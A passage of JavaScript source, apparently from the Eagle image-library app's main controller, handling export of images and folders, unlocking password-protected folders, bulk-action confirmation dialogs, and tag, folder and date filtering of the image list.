                                	if (backgroundWindowID === undefined) {
	                                    IPCHelper.send('export-as-folder', {
	                                        folder: undefined,
	                                        images: $scope.selected,
	                                        savePath: savePath,
	                                        needSpace: needSpace
	                                    });
	                                }
	                                else {
	                                	IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
	                                        folder: undefined,
	                                        images: $scope.selected,
	                                        savePath: savePath,
	                                        needSpace: needSpace
	                                    });
	                                }
                                });
                            }
                            else {
                            	if (backgroundWindowID === undefined) {
	                                IPCHelper.send('export-as-folder', {
	                                    folder: undefined,
	                                    images: $scope.selected,
	                                    savePath: savePath,
	                                    needSpace: needSpace
	                                });
	                            }
	                            else {
	                            	IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
	                                    folder: undefined,
	                                    images: $scope.selected,
	                                    savePath: savePath,
	                                    needSpace: needSpace
	                                });
	                            }
                            }
                        });
                    });
                }
            });
        };



        $scope.exportFolderAsFolder = (folder) => {
            $scope.exportFolder(function (savePath) {
                var images = [];
                if (savePath) {
                    // $scope.raw.forEach(function (image) {
                    for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                        try {
                            var image = $scope.raw[rindex];
                            var isContain = image.folders.indexOf(folder.id) > -1;
                            if (!isContain) {
                                eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                                    if (image.folders.indexOf(child.id) > -1) {
                                        isContain = true;
                                        return;
                                    }
                                });
                            }
                            if (isContain) {
                                images.push(image);
                            }
                        }
                        catch (err) {}
                    }
                    var folderDir = path.normalize(savePath + "/" + folder.name.replace(/\//g, " ").replace(/\\/g," ").replace(/%/g, ""));

                    var needSpace = eagle.inspector.calculateFileSize(images);
                    $scope.checkDiskSpace(savePath, needSpace, function () {

                        if (fs.existsSync(folderDir)) {

                            var message = $filter('i18n')("Dialog.Folder.Export.As.Folder.Message", [
                                { "property": "folderDir", "value": folderDir }
                            ]);

                            swal({
                                html: `
                                    <div class="alert">
                                        <div class="alert-icon warning"></div>
                                        <h4 class="alert-title">${i18n.__("Dialog.Folder.Export.As.Folder.Title")}</h4>
                                        <p class="alert-desc">${message}</p>
                                    </div>
                                `,
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                width: 400,
                                customClass: "alert-box",
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__("Dialog.Folder.Export.As.Folder.Button"),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(function () {
                                if (backgroundWindowID === undefined) {
                                    IPCHelper.send('export-as-folder', {
                                        folder: folder,
                                        images: images,
                                        savePath: savePath
                                    });
                                }
                                else {
                                    IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
                                        folder: folder,
                                        images: images,
                                        savePath: savePath
                                    });
                                }
                            });
                        }
                        else {
                            if (backgroundWindowID === undefined) {
                                IPCHelper.send('export-as-folder', {
                                    folder: folder,
                                    images: images,
                                    savePath: savePath
                                });
                            }
                            else {
                                IPCHelper.sendTo(backgroundWindowID, 'export-as-folder', {
                                    folder: folder,
                                    images: images,
                                    savePath: savePath
                                });
                            }
                        }
                    });
                }
            });
        };

        $scope.exportFolderAsEaglepack = (folder) => {
            var images = [];
            var f = {};
            for (var rindex = $scope.raw.length - 1; rindex >= 0; rindex--) {
                try {
                    var image = $scope.raw[rindex];
                    var isContain = image.folders.indexOf(folder.id) > -1;
                    if (!isContain) {
                        eagle.utils.tree.walk(folder.children, 'children', function(child, parent) {
                            if (image.folders.indexOf(child.id) > -1) {
                                isContain = true;
                                return;
                            }
                        });
                    }
                    if (isContain) {
                        images.push(image);
                    }
                }
                catch (err) {}
            }
            angular.extend(f, folder);
            f.images = images;
            var defaultPath = path.join("*/", 'Untitled' + '.eaglepack');
            if (folder) {
                defaultPath = path.join("*/", folder.name.replace(/^\./, "") + '.eaglepack');
            }

            dialog.showSaveDialog(currentWindow, {
                defaultPath: defaultPath,
                title: i18n.__('Context.Image.Export'),
                filters: [{ name: 'Eagle Package File', extensions: ['eaglepack'] }]
            }).then(result => {
                var savePath = result.filePath;
                if (!savePath) return;
                if (backgroundWindowID === undefined) {
                    IPCHelper.send('export-images', {
                        folder: f,
                        savePath: savePath
                    });
                }
                else {
                    IPCHelper.sendTo(backgroundWindowID, 'export-images', {
                        folder: f,
                        savePath: savePath
                    });
                }
            });
        };

        $scope.exportSelectedAsEaglepack = function () {
            if ($scope.selected.length === 0) return;
            var defaultPath = path.join("*/", 'Untitled' + '.eaglepack');

            dialog.showSaveDialog(currentWindow, {
                defaultPath: defaultPath,
                title: i18n.__('Context.Image.Export'),
                filters: [{ name: 'Eagle Package File', extensions: ['eaglepack'] }]
            }).then(result => {
                var savePath = result.filePath;
                if (!savePath) return;
                if (backgroundWindowID === undefined) {
                    IPCHelper.send('export-images', {
                        images: $scope.selected,
                        savePath: savePath
                    });
                }
                else {
                    IPCHelper.sendTo(backgroundWindowID, 'export-images', {
                        images: $scope.selected,
                        savePath: savePath
                    });
                }
            });
        };

        $scope.exportFolder = function(callback) {
            dialog.showOpenDialog(currentWindow, {
                title: $filter('i18n')('dialog.exportAsFolder.title'),
                filters: [],
                properties: ['openDirectory', 'createDirectory'],
                buttonLabel: $filter('i18n')("dialog.exportAsFolder.botton")
            }).then(result => {
                var paths = result.filePaths;
                if (paths && paths[0]) {
                    var savePath = paths[0];
                    callback(savePath)
                }
                else {
                    callback(undefined);
                }
            });
        };

        $scope.exportSelectedAsFormat = function () {
            if ($scope.selected.length === 0) return;
            $rootScope.$broadcast("EXPORT_IMAGE", {
                images: $scope.selected
            });
        };

        $scope.checkDiskSpace = (path, needSpace, callback) => {
            callback && callback();
        };

        $scope.unlockFolderConf = (folder, successCallback, errorCallback) => {
            try {

                if (!folder) {
                    errorCallback && errorCallback();
                    return;
                }

                var folderPwd = window.atob(folder.password);
                var message = $filter('i18n')("dialog.unlockFolder.desc", [
                    { "property": "folderName", "value": folder.name },
                ]);
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon info"></div>
                            <h4 class="alert-title">${i18n.__("dialog.unlockFolder.title")}</h4>
                            <p class="alert-desc">${message}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    input: 'password',
                    inputPlaceholder: "",
                    inputValue: '',
                    inputValidator: function (value) {
                        return new Promise(function (resolve, reject) {
                            if (folderPwd === value) {
                                resolve()
                            }
                            else {
                                reject(i18n.__('Dialog.CreateLibrary.Error'))
                            }
                        })
                    },
                    cancelButtonColor: "#777777",
                    confirmButtonText: i18n.__("dialog.unlockFolder.btn"),
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function (result) {
                    successCallback && successCallback();
                    $scope.$evalAsync();
                }, function () {
                    errorCallback && errorCallback();
                    $scope.$evalAsync();
                });
            }
            catch (err) {
                errorCallback && errorCallback();
                $scope.$evalAsync();
            }
        };

        $scope.checkOperationSafety = (callback, amount = 100) => {
            try {
                if ($scope.selected && $scope.selected.length >= amount) {
                    var html = $filter('i18n')("Dialog.BulkAction.Descript", [
                        { "property": "count", "value": $scope.selected.length },
                    ]);
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon warning"></div>
                                <h4 class="alert-title">${i18n.__("Dialog.BulkAction.Title")}</h4>
                                <p class="alert-desc">${html}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("Dialog.BulkAction.Button"),
                        cancelButtonText: i18n.__("general.cancel"),
                        allowEnterKey: false,
                    }).then(function (result) {
                        callback && callback();
                        $scope.$evalAsync();
                    });
                }
                else {
                    callback && callback();
                }
            }
            catch (err) {
                callback && callback();
            }
        };

        $scope.checkOperationSafety2 = (count, callback, amount = 100) => {
            try {
                if (count >= amount) {
                    var html = $filter('i18n')("Dialog.BulkAction.Descript", [
                        { "property": "count", "value": count },
                    ]);
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon warning"></div>
                                <h4 class="alert-title">${i18n.__("Dialog.BulkAction.Title")}</h4>
                                <p class="alert-desc">${html}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                        allowEnterKey: false,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("Dialog.BulkAction.Button"),
                        cancelButtonText: i18n.__("general.cancel"),
                    }).then(function (result) {
                        callback && callback();
                        $scope.$evalAsync();
                    });
                }
                else {
                    callback && callback();
                }
            }
            catch (err) {
                callback && callback();
            }
        };

        $scope.openPinterest = function() {
        	switch ($rootScope.preferences.general.language) {
                case 'zh_CN':
                	shell.openExternal("https://docs-cn.eagle.cool/article/828-import-from-pinterest");
                	break;
                case 'zh_TW':
                	shell.openExternal("https://docs-tw.eagle.cool/article/950-import-from-pinterest");
                    break;
                default:
                    shell.openExternal("https://docs-en.eagle.cool/article/517-import-from-pinterest");
                    break;
            }
        };

        $scope.openHuaban = function() {
            shell.openExternal("https://docs-cn.eagle.cool/article/402-import-from-huaban");
        };

        $scope.openArtstation = function() {
            $rootScope.$broadcast("IMPORT_ARTSTATION");
        };

        $scope.importFolders = function (currentFolder) {
            dialog.showOpenDialog(currentWindow, {
                title: $filter('i18n')('dialog.importLocalFolder.title'),
                properties: ['openDirectory', 'multiSelections']
            }).then(result => {
                var paths = result.filePaths;
                if (paths && paths.length > 0) {
                    paths.forEach(function (p) {
                        // 避免用户导入资源库
                        if (p.endsWith(".library")) {
                            if (paths.length === 1) {
                                ipcRenderer.send('open-library', p);
                            }
                            return;
                        }
                        // 避免用户导入 Pixave 资源库
                        else if (p.endsWith(".pxvlibrary")) {
                            return;
                        }
                        uploadFolderToSidebar(p, currentFolder);
                    });
                }
            });
        };

        $scope.undo = function() {
            $rootScope.undo();
            $rootScope.closeAll();
        };

        var rebindRefreshLazyTimeout;
        $scope.rebindRefreshLazy = function() {
            $timeout.cancel(rebindRefreshLazyTimeout);
            rebindRefreshLazyTimeout = $timeout(function() {
                $scope.rebindRefresh();
            }, 1000);
        }

        var muteRebind = throttle(function muteRebind () {
            $scope.rebindRefresh(true);
        }, 3000, true);

        $scope.filterWithFolder = function (folder) {

            if (eagle.filter.filterRules.folder.exclude[folder.id]) {
                $scope.excludeWithFolder(folder);
                return;
            }

            if (eagle.filter.filterRules.folder.includes[folder.id]) {
                delete eagle.filter.filterRules.folder.includes[folder.id];
            }
            else {
                eagle.filter.filterRules.folder.includes[folder.id] = folder;
                delete eagle.filter.filterRules.folder.exclude[folder.id];
            }

            if (eagle.filter.folderFilterLogic === "AND") {
                eagle.filter.filterFolderKeyword = "";
                $("#filter-folder-list").scrollTop(0);
            }

            $scope.filterContent();
            $scope.calculateFilterCounts();
            analytics.event('Filter', 'Folder');
        };

        $scope.excludeWithFolder = function (folder) {
            if (eagle.filter.filterRules.folder.exclude[folder.id]) {
                delete eagle.filter.filterRules.folder.exclude[folder.id];
            }
            else {
                eagle.filter.filterRules.folder.exclude[folder.id] = folder;
                delete eagle.filter.filterRules.folder.includes[folder.id];
            }

            if (eagle.filter.folderFilterLogic === "AND") {
                $("#filter-folder-list").scrollTop(0);
            }

            $scope.filterContent();
            $scope.calculateFilterCounts();
            analytics.event('Filter', 'Folder');
        };

        $scope.filterWithTag = function (tag) {

            if (tag.isExcluded) {
                $scope.excludeWithTag(tag);
                return;
            }

            // 已存在
            if (tag.isNoTags) {
                eagle.filter.filterRules.tag.no = !eagle.filter.filterRules.tag.no;
                tag.isSelected = eagle.filter.filterRules.tag.no;
            }
            else {
                var tagName = tag.name;

                var eidx = eagle.filter.filterRules.tag.exclude.indexOf(tagName);
                if (eidx > -1) {
                    eagle.filter.filterRules.tag.exclude.splice(idx, 1);
                    tag.isExcluded = false;
                }
                else {
                    var idx = eagle.filter.filterRules.tag.includes.indexOf(tagName);
                    if (idx > -1) {
                        eagle.filter.filterRules.tag.includes.splice(idx, 1);
                        tag.isSelected = false;
                    }
                    else {
                        eagle.filter.filterRules.tag.includes.push(tagName);
                        tag.isSelected = true;
                        tag.isExcluded = false;
                    }
                }
            }

            if (eagle.filter.tagFilterLogic === "AND") {
                // $scope.tagKeyword = "";
                $("#filter-panel .tags-container").scrollTop(0);
            }

            $scope.filterContent();
            $scope.calculateFilterCounts();
        };

        $scope.excludeWithTag = function (tag) {
            // 已存在
            if (tag.isNoTags) {
                eagle.filter.filterRules.tag.no = !eagle.filter.filterRules.tag.no;
                tag.isSelected = false;
                tag.isExcluded = true;
            }
            else {
                var tagName = tag.name;
                var idx = eagle.filter.filterRules.tag.includes.indexOf(tagName);
                if (idx > -1) {
                    eagle.filter.filterRules.tag.includes.splice(idx, 1);
                    tag.isSelected = false;
                }
                else {
                    var eidx = eagle.filter.filterRules.tag.exclude.indexOf(tagName);
                    if (eidx > -1) {
                        eagle.filter.filterRules.tag.exclude.splice(eidx, 1);
                        tag.isExcluded = false;
                    }
                    else {
                        eagle.filter.filterRules.tag.exclude.push(tagName);
                        tag.isExcluded = true;
                        tag.isSelected = false;
                    }
                }
            }

            $scope.tagKeyword = "";
            $scope.filterContent();
        };

        $scope.filterWithTags = function (tags) {
            eagle.filter.filterRules.tag.includes = [];
            $scope.containTags.forEach(function (tagObject) {
                tags.forEach(function (tagName) {
                    if (tagObject.name === tagName) {
                        eagle.filter.filterRules.tag.includes.push(tagName);
                        tagObject.isSelected = true;
                    }
                    else {
                        tagObject.isSelected = false;
                    }
                })
            });

            $scope.tagKeyword = "";
            $scope.filterContent();
        };

        // 計算當前列表经过筛选后包含的标签
        $scope.calcuteContainTags = function (data) {

            var result = calcuteContainTags(data);

            // 建立群组列表
            var groups = [];
            var tagsMappings = result.containTagsMappings;
            TagManager.groups.forEach(function (group) {
                var groupObject = [];
                group.tags.forEach(function (tag) {
                    if (tagsMappings[tag]) {
                        groupObject.push(tagsMappings[tag]);
                        tagsMappings[tag].type = "group-item";
                        tagsMappings[tag].group = group;
                    }
                });
            });

            $scope.containTags = [];

            var collator = new Intl.Collator(undefined, { numeric: true, sensitivity: 'base' } );
            result.containTags = result.containTags.sort(function (a, b) {
                return collator.compare(a.name, b.name);
            });

            result.containTags.forEach(function (tag) {
                $scope.containTags.push(tag);
            });

            // 显示未标签功能
            if (result.noTagsCount > 0) {
                $scope.containTags.unshift({
                    isSelected: eagle.filter.filterRules.tag.no,
                    name: i18n.__("Filter.NoTags"),
                    imageCount: result.noTagsCount,
                    index: 100000000,
                    isNoTags: true
                });
            }
        };

        function calcuteContainTags (data) {
            var tagsCount = {};
            var tagsMappings = {};
            var noTagsCount = 0;

            eagle.filter.filterRules.tag.exclude.forEach(function (tag) {
                tagsCount[tag] = 0;
            });

            for (var i = data.length - 1; i >= 0; i--) {
                var image = data[i];
                if (image.tags && image.tags.length > 0) {
                    image.tags.forEach(function (tag) {
                        if (tag && tag.length > 200) return;
                        if (!tagsCount[tag]) { tagsCount[tag] = 0 };
                        tagsCount[tag]++;
                    });
                }
                else {
                    noTagsCount++;
                }
            }

            var tags = Object.keys(tagsCount).map(function(key) {
                var idx = eagle.filter.filterRules.tag.includes.indexOf(key);
                var eidx = eagle.filter.filterRules.tag.exclude.indexOf(key);
                var index;
                if (idx > -1 && (eagle.filter.tagFilterLogic === "AND")) {
                    index = tagsCount[key] - idx;
                }
                else if (eidx > -1 && (eagle.filter.tagFilterLogic === "AND")) {
                    index = tagsCount[key] - 100;
                }
                else {
                    index = tagsCount[key] - 100;
                }
                tagsMappings[key] = {
                    isSelected: idx > -1,
                    isExcluded: eidx > -1,
                    name: key,
                    pinyin: $scope.TagManager.tagMappings[key] && $scope.TagManager.tagMappings[key].pinyin,
                    imageCount: tagsCount[key],
                    index: index
                };
                return tagsMappings[key];
            });

            tags.sort(function (tag1, tag2) {
                return tag2.imageCount - tag1.imageCount;
            });

            if (noTagsCount === 0 && !eagle.filter.isLock) {
                eagle.filter.filterRules.tag.no = false;
            }

            return {
                containTagsMappings: tagsMappings,
                containTags: tags,
                noTagsCount: noTagsCount
            }
        }

        // 計算當前列表经过筛选后包含的文件夹
        $scope.calcuteContainFolders = function (data) {

            var result = calcuteContainFolders(data);
            var foldersMappings = result.containFoldersMappings;
            
            $scope.containFolders = [];

            if (result.noFoldersCount > 0) {
                $scope.containFolders.push({
                    id: "NoFolders",
                    name: i18n.__('general.pages.unfiled'),
                    isNoFolder: true,
                    imageCount: result.noFoldersCount
                });
            }

            eagle.utils.tree.walk($scope.folders, 'children', function (folder, parent, depth) {
                var folderId = folder.id;
                if (foldersMappings[folderId]) {
                    $scope.containFolders.push(foldersMappings[folderId]);
                }
            });
        };

        function calcuteContainFolders (data) {
            var foldersCount = {};
            var foldersMappings = {};
            var noFoldersCount = 0;

            for (var i = data.length - 1; i >= 0; i--) {
                var image = data[i];
                if (image.folders && image.folders.length > 0) {
                    image.folders.forEach(function (folder) {
                        if (!foldersCount[folder]) { foldersCount[folder] = 0 };
                        foldersCount[folder]++;
                    });
                }
                else {
                    noFoldersCount++;
                }
            }

            var folders = Object.keys(foldersCount).map(function(key) {
                var folder = $scope.folderMappings[key];
                if (!folder) return;
                var index = foldersCount[key];

                foldersMappings[key] = {
                    id: key,
                    isSelected: !!eagle.filter.filterRules.folder.includes[key],
                    name: folder.name,
                    pinyin: folder.pinyin,
                    imageCount: foldersCount[key],
                    index: index
                };
                return foldersMappings[key];
            });

            folders = folders.filter(function (f) {
                return !!f;
            });

            return {
                containFoldersMappings: foldersMappings,
                containFolders: folders,
                noFoldersCount: noFoldersCount
            }
        }
        

        $scope.relayout = function (margin) {
            if (!$scope.isItemBindCalculated) return;
            var $container = $("#box-container");
            var currentImageSize = $scope.imageSize.height;
            $("#box-container").attr("box-size", Math.floor(currentImageSize / 5) * 5);
            if ($scope.layout === "JustifiedLayout") {
                var cw = $container.width();
                ig.setLayout(eg.InfiniteGrid.JustifiedLayout, {
                    minSize: currentImageSize * 1 - 10,
                    maxSize: currentImageSize * 1 + 10,
                    margin: 8,
                });
                ig._renderer.updateSize(ig.getItems(false));
                ig.layout(true);
                ig._watcher._onCheck();
            }
            else if ($scope.layout === "ListLayout") {
                ig.setLayout(eg.InfiniteGrid.GridLayout, {
                    margin: 0,
                    align: "left",
                });
                ig._renderer.updateSize(ig.getItems(false));
                ig.layout(true);
                ig._watcher._onCheck();
            }
            else {
                ig.setLayout(eg.InfiniteGrid.GridLayout, {
                    margin: Math.max(margin, 8) || 8,
                    align: "left",
                });
                ig._renderer.updateSize(ig.getItems(false));
                ig.layout(true);
                ig._watcher._onCheck();
            }
            ig._updateContainerHeight();
        };

        $scope.rebindRefresh = function rebindRefresh (muteMode, contentFilterCache, startCursor) {

            if (!$scope.isItemBindCalculated) return;
            if (!$scope.raw) return;
            console.time("rebindRefresh");
            var data = [];

            console.time("calcuteFilterResult");
            data = $scope.calcuteFilterResult(data, contentFilterCache);
            console.timeEnd("calcuteFilterResult");


            // 计算这批图片里面出现的标签
            if (eagle.filter.tagFilterLogic === "OR" || eagle.filter.tagFilterLogic === "EQUAL") {
                $scope.calcuteContainTags($scope.preelaborations);
            }
            else if (eagle.filter.tagFilterLogic === "AND") {
                $scope.calcuteContainTags(data);
            }

            // 计算 Filter Badge 数量
            calcuteFilterBadge();

            // 置顶排序
            console.time("sort:置顶");
            if ($scope.currentFolder && $scope.currentFolder.orderBy !== "RANDOM") {
                let currentFolderId = $scope.currentFolder.id;
                data = data.sort(function(a, b) {
                    var ta = a.pinned? a.pinned[currentFolderId]:undefined;
                    var tb = b.pinned? b.pinned[currentFolderId]:undefined;
                    if (ta || tb) {
                        try {
                            if (ta && !tb) return -1;
                            if (!ta && tb) return 1;
                            if(ta > tb) return -1;
                            if(ta < tb) return 1;
                            return 0;
                        } catch (err) {
                            return 0;
                        }
                    }
                });
            }
            console.timeEnd("sort:置顶");

            $scope.allData = data;

            // Note: 2019/08/05 避免拖拽順序使用 $scope.itemMappings 獲取的內容跟真實內容不一致，造成拖拽無法使用
            // 這段代碼主要用來刷新頁面上出現元件的有效性
            if ($scope.currentFolder) {
                try {
                    for (let i = 0; i < $scope.allData.length; i++) {
                        $scope.itemMappings[$scope.allData[i].id] = $scope.allData[i];
                    }
                } catch (err) {}
            }

            $scope.filtereds = $scope.allData.slice(0, $scope.len * $scope.page);

            $scope.refreshSubfolderList();

            // 減少重複計算，將原先計算智能文件夾數量功能，放在這裡
            if ($rootScope.selectedSmartFolders.length === 0 && $scope.currentSmartFolder) {
            	if ($scope.currentSmartFolder.conditions && $scope.currentSmartFolder.conditions.length > 0) {
                	$scope.currentSmartFolder.imageCount = $scope.allData.length;
                }
            }

            let currentViewDataLength = $scope.allData.length;
            if (currentViewDataLength < 200) {
                $scope.keywordDebounce = 50;
            }
            else if (currentViewDataLength < 50000) {
                $scope.keywordDebounce = 200;
            }
            else if (currentViewDataLength < 100000) {
                $scope.keywordDebounce = 250;
            }
            else {
                $scope.keywordDebounce = 300;
            }

            console.timeEnd("rebindRefresh");
            setTimeout(function () { showImages(); }, 120);
            setTimeout(function () { showImages(); }, 800);

            if (!muteMode) {
                if (eagle.filter.filterBadge > 0) $scope.startCursor = 0;
                resetNgGridLayoutData($scope.allData, startCursor || $scope.startCursor);
            }
            $scope.updateItemsView($scope.selected);
            $("#box-container-scrollbar").trigger("UPDATE_BOX_SCROLLBAR");
            if (HoverPreview.isShow) {
                HoverPreview.hide();
            }
            $scope.$evalAsync();
        };

        $scope.refreshSubfolderList = function () {
            // 过滤子文件夹
            if ($scope.currentFolder) {
                let subFolders = [];
                if ($scope.showSubfolderContent) {
                    $scope.subFolders = getAllChildFolder($scope.currentFolder);
                    $scope.subFolderSortableOptions.disabled = true;
                }
                else {
                    $scope.subFolders = $scope.currentFolder.children;
                    $scope.subFolderSortableOptions.disabled = false;
                }
                if ($scope.keyword) {
                    $scope.subFolders = $scope.subFolders.filter(function (folder) {
                        if (folder.name.toLowerCase().indexOf($scope.keyword.toLowerCase()) > -1) {
                            return true;
                        }
                        if (folder && folder.tags) {
                            var folderTags = folder.tags.join("");
                            if (folderTags.toLowerCase().indexOf($scope.keyword.toLowerCase()) > -1) {
                                return true;
                            }
                        }
                    });
                    $scope.subFolderSortableOptions.disabled = true;
                }
            }
            else {
                $scope.subFolders = [];
            }
        };

        $scope.resetKeyword = function () {
            $scope.keyword = "";
        };

		$scope.resetFilterHandler = () => {
			$scope.resetFilter();
			$scope.filterContent();
		};

        $scope.resetFilter = function () {
            eagle.filter.isLock = false;
            eagle.filter.filterBadge = 0;

            eagle.filter.resetFilterRules();

            $scope.containTags = [];
            $scope.containFolders = [];

            eagle.filter.filterRules.import.selectedMonths = {};
            eagle.filter.filterRules.mtime.selectedMonths = {};

            $("[filter-item].open").removeClass("open");
            $scope.startCursor = 0;
            $rootScope.$broadcast("Reset_Filter");
            $scope.calculateFilterCounts();
        };

        // 计算过滤条件数量
        function calcuteFilterBadge () {
            eagle.filter.filterBadge = 0;
            // 标签
            if (eagle.filter.filterRules.tag.includes) {
                eagle.filter.filterBadge += eagle.filter.filterRules.tag.includes.length;
            }
            if (eagle.filter.filterRules.tag.exclude) {
                eagle.filter.filterBadge += eagle.filter.filterRules.tag.exclude.length;
            }
            var filterFolderCount = Object.keys(eagle.filter.filterRules.folder.includes).length;
            if (filterFolderCount) {
                eagle.filter.filterBadge += filterFolderCount;
            }
            var excludeFolderCount = Object.keys(eagle.filter.filterRules.folder.exclude).length;
            if (excludeFolderCount) {
                eagle.filter.filterBadge += excludeFolderCount;
            }
            
            if (eagle.filter.filterRules.tag.no) { eagle.filter.filterBadge++; }
            // 颜色
            if (eagle.filter.filterRules.color.value) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.color.gray) eagle.filter.filterBadge++;
            // 类型
            if (eagle.filter.filterRules.shape.landscape) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape.portrait) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape.square) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape.panoramicLandscape) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape.panoramicPortrait) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape.custom) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape['43']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape['34']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape['169']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.shape['916']) eagle.filter.filterBadge++;


            // 相机
            if (Object.keys(eagle.filter.filterRules.camera).length > 0) {
                eagle.filter.filterBadge += Object.keys(eagle.filter.filterRules.camera).length;
            }
            // 星等
            if (eagle.filter.filterRules.rating['5']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.rating['4']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.rating['3']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.rating['2']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.rating['1']) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.rating['0']) eagle.filter.filterBadge++;
            // 字体
            if (eagle.filter.filterRules.font.activated) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.font.deactivated) eagle.filter.filterBadge++;

            // 类型
            eagle.filter.filterBadge += Object.keys(eagle.filter.filterRules.type).length;
            
            // 时间过滤
            if (eagle.filter.filterRules.import.today) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.import.yesterday) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.import.last7day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.import.last30day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.import.last90day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.import.last365day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.import.usingRange) eagle.filter.filterBadge++;
            if (Object.keys(eagle.filter.filterRules.import.selectedMonths).length > 0) {
                eagle.filter.filterBadge += Object.keys(eagle.filter.filterRules.import.selectedMonths).length;
            }

            // 修改时间过滤
            if (eagle.filter.filterRules.mtime.today) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.mtime.yesterday) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.mtime.last7day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.mtime.last30day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.mtime.last90day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.mtime.last365day) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.mtime.usingRange) eagle.filter.filterBadge++;
            if (Object.keys(eagle.filter.filterRules.mtime.selectedMonths).length > 0) {
                eagle.filter.filterBadge += Object.keys(eagle.filter.filterRules.mtime.selectedMonths).length;
            }

            // 解析度
            if (eagle.filter.filterRules.resolution.minW) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.resolution.maxW) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.resolution.minH) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.resolution.maxH) eagle.filter.filterBadge++;
            // 档案大小
            if (eagle.filter.filterRules.file.min) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.file.max) eagle.filter.filterBadge++;
            // 长度
            if (eagle.filter.filterRules.duration.min) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.duration.max) eagle.filter.filterBadge++;
            // BPM
            if (eagle.filter.filterRules.bpm.min) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.bpm.max) eagle.filter.filterBadge++;
            // 标注
            if (eagle.filter.filterRules.annotation.has) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.annotation.no) eagle.filter.filterBadge++;
            // 标注
            if (eagle.filter.filterRules.note.has) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.note.no) eagle.filter.filterBadge++;
            // 网址
            if (eagle.filter.filterRules.url.has) eagle.filter.filterBadge++;
            if (eagle.filter.filterRules.url.no) eagle.filter.filterBadge++;
        };

        $scope.converFilterToSmartFolder = function () {
        };

        // 计算过滤后的图片列表
        $scope.calcuteFilterResult = function (data, contentFilterCache) {

            $scope.colorDistancesMap = {};
            if (contentFilterCache) {
                data = contentFilterCache.slice(0);
            }
            else {
                data = $scope.raw.filter($scope.contentFilter);
                $scope.contentFilterCache = data.slice(0);
            }
            return $scope.filterData(data);
        }

        $scope.filterData = function (data) {

            if (Object.keys(eagle.filter.filterRules.import.selectedMonths).length > 0) {
                data = data.filter(function (image) {
                    let importDate = new Date(image.modificationTime);
                    let importYear = importDate.getFullYear();
                    let importMonth = ("" + (importDate.getMonth() + 1)).padStart(2, "0");
                    return eagle.filter.filterRules.import.selectedMonths[`${importYear}/${importMonth}`];
                });
            }

            // 时间筛选
            if (eagle.filter.filterRules.import.today || eagle.filter.filterRules.import.yesterday || eagle.filter.filterRules.import.last7day || eagle.filter.filterRules.import.last30day || eagle.filter.filterRules.import.last90day || eagle.filter.filterRules.import.last365day || eagle.filter.filterRules.import.usingRange) {

                var ONE_DAY = 1000 * 60 * 60 * 24;
                let today = new Date();
                today.setHours(0,0,0);
                let todayTime = today.getTime();
                let yesterdayTime = todayTime - ONE_DAY;

                data = data.filter(function (image) {

                    var result = false;
                    if (eagle.filter.filterRules.import.today) {
                        if (image.modificationTime > todayTime) result = true;
                    }
                    if (eagle.filter.filterRules.import.yesterday) {
                        if (image.modificationTime < todayTime && image.modificationTime > yesterdayTime) result = true;
                    }
                    if (eagle.filter.filterRules.import.last7day) {
